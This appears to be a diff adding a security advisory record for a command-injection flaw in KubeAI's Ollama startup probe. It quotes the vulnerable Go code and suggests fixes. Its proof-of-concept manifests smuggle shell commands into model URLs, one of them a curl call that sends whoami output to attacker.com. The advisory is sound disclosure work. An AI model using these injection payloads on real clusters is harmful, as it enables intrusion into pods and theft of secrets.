@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-324q-cwx9-7crr",
+  "modified": "2026-04-02T13:34:27.112400Z",
+  "published": "2026-04-01T23:22:43Z",
+  "aliases": [
+    "CVE-2026-34940"
+  ],
+  "summary": "KubeAI: OS Command Injection via Model URL in Ollama Engine startup probe allows arbitrary command execution in model pods",
+  "details": "## CHAMP: Description\n\n### Summary\n\nThe `ollamaStartupProbeScript()` function in `internal/modelcontroller/engine_ollama.go` constructs a shell command string using `fmt.Sprintf` with unsanitized model URL components (`ref`, `modelParam`). This shell command is executed via `bash -c` as a Kubernetes startup probe. An attacker who can create or update `Model` custom resources can inject arbitrary shell commands that execute inside model server pods.\n\n### Details\n\nThe `parseModelURL()` function in `internal/modelcontroller/model_source.go` uses a regex (`^([a-z0-9]+):\\/\\/([^?]+)(\\?.*)?$`) to parse model URLs. The `ref` component (capture group 2) matches `[^?]+`, allowing any characters except `?`, including shell metacharacters like `;`, `|`, `$()`, and backticks.\n\nThe `?model=` query parameter (`modelParam`) is also extracted without any sanitization.\n\n**Vulnerable code** ([permalink](https://github.com/kubeai-project/kubeai/blob/ba1824e8c1d70c9092b6c0a48199bba3b8973fee/internal/modelcontroller/engine_ollama.go#L185-L196)):\n\n```go\nfunc ollamaStartupProbeScript(m *kubeaiv1.Model, u modelURL) string {\n    startupScript := \"\"\n    if u.scheme == \"pvc\" {\n        startupScript = fmt.Sprintf(\"/bin/ollama cp %s %s\", u.modelParam, m.Name)\n    } else {\n        if u.pull {\n            pullCmd := \"/bin/ollama pull\"\n            if u.insecure {\n                pullCmd += \" --insecure\"\n            }\n            startupScript = fmt.Sprintf(\"%s %s \u0026\u0026 /bin/ollama cp %s %s\", pullCmd, u.ref, u.ref, m.Name)\n        } else {\n            startupScript = fmt.Sprintf(\"/bin/ollama cp %s %s\", u.ref, m.Name)\n        }\n    }\n    // ...\n    return startupScript\n}\n```\n\nThis script is then used as a `bash -c` startup probe ([permalink](https://github.com/kubeai-project/kubeai/blob/ba1824e8c1d70c9092b6c0a48199bba3b8973fee/internal/modelcontroller/engine_ollama.go#L108-L112)):\n\n```go\nStartupProbe: \u0026corev1.Probe{\n    ProbeHandler: corev1.ProbeHandler{\n        Exec: \u0026corev1.ExecAction{\n            Command: []string{\"bash\", \"-c\", startupProbeScript},\n        },\n    },\n},\n```\n\n**Compare with the vLLM engine** which safely passes the model ref as a command-line argument (not through a shell):\n\n```go\n// engine_vllm.go - safe: args are passed directly, no shell involved\nargs := []string{\n    \"--model=\" + vllmModelFlag,\n    \"--served-model-name=\" + m.Name,\n}\n```\n\n**URL parsing** ([permalink](https://github.com/kubeai-project/kubeai/blob/ba1824e8c1d70c9092b6c0a48199bba3b8973fee/internal/modelcontroller/model_source.go#L229-L270)):\n\n```go\nvar modelURLRegex = regexp.MustCompile(`^([a-z0-9]+):\\/\\/([^?]+)(\\?.*)?$`)\n\nfunc parseModelURL(urlStr string) (modelURL, error) {\n    // ref = matches[2] -\u003e [^?]+ allows shell metacharacters\n    // modelParam from ?model= query param -\u003e completely unsanitized\n}\n```\n\nThere is no admission webhook or CRD validation that sanitizes the URL field.\n\n### PoC\n\n**Attack vector 1: Command injection via `ollama://` URL ref**\n\n```yaml\napiVersion: kubeai.org/v1\nkind: Model\nmetadata:\n  name: poc-cmd-inject\nspec:\n  features: [\"TextGeneration\"]\n  engine: OLlama\n  url: \"ollama://registry.example.com/model;id\u003e/tmp/pwned;echo\"\n  minReplicas: 1\n  maxReplicas: 1\n```\n\nThe startup probe script becomes:\n```bash\n/bin/ollama pull registry.example.com/model;id\u003e/tmp/pwned;echo \u0026\u0026 /bin/ollama cp registry.example.com/model;id\u003e/tmp/pwned;echo poc-cmd-inject \u0026\u0026 /bin/ollama run poc-cmd-inject hi\n```\n\nThe injected `id\u003e/tmp/pwned` command executes inside the pod.\n\n**Attack vector 2: Command injection via `?model=` query parameter**\n\n```yaml\napiVersion: kubeai.org/v1\nkind: Model\nmetadata:\n  name: poc-cmd-inject-pvc\nspec:\n  features: [\"TextGeneration\"]\n  engine: OLlama\n  url: \"pvc://my-pvc?model=qwen2:0.5b;curl${IFS}http://attacker.com/$(whoami);echo\"\n  minReplicas: 1\n  maxReplicas: 1\n```\n\nThe startup probe script becomes:\n```bash\n/bin/ollama cp qwen2:0.5b;curl${IFS}http://attacker.com/$(whoami);echo poc-cmd-inject-pvc \u0026\u0026 /bin/ollama run poc-cmd-inject-pvc hi\n```\n\n### Impact\n\n1. **Arbitrary command execution** inside model server pods by any user with Model CRD create/update RBAC\n2. In multi-tenant Kubernetes clusters, a tenant with Model creation permissions (but not cluster-admin) can execute arbitrary commands in model pods, potentially accessing secrets, service account tokens, or lateral-moving to other cluster resources\n3. Data exfiltration from the model pod's environment (environment variables, mounted secrets, service account tokens)\n4. Compromise of the model serving infrastructure\n\n### Suggested Fix\n\nReplace the `bash -c` startup probe with either:\n1. An exec probe that passes arguments as separate array elements (like the vLLM engine does), or\n2. Validate/sanitize `u.ref` and `u.modelParam` to only allow alphanumeric characters, slashes, colons, dots, and hyphens before interpolating into the shell command\n\nExample fix:\n```go\n// Option 1: Use separate args instead of bash -c\nCommand: []string{\"/bin/ollama\", \"pull\", u.ref}\n\n// Option 2: Sanitize inputs\nvar safeModelRef = regexp.MustCompile(`^[a-zA-Z0-9._:/-]+$`)\nif !safeModelRef.MatchString(u.ref) {\n    return \"\", fmt.Errorf(\"invalid model reference: %s\", u.ref)\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/kubeai-project/kubeai",
+        "purl": "pkg:golang/github.com/kubeai-project/kubeai"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.23.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.23.1",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/04/GHSA-324q-cwx9-7crr/GHSA-324q-cwx9-7crr.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/kubeai-project/kubeai/security/advisories/GHSA-324q-cwx9-7crr"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/kubeai-project/kubeai"
+    }
+  ]
+}
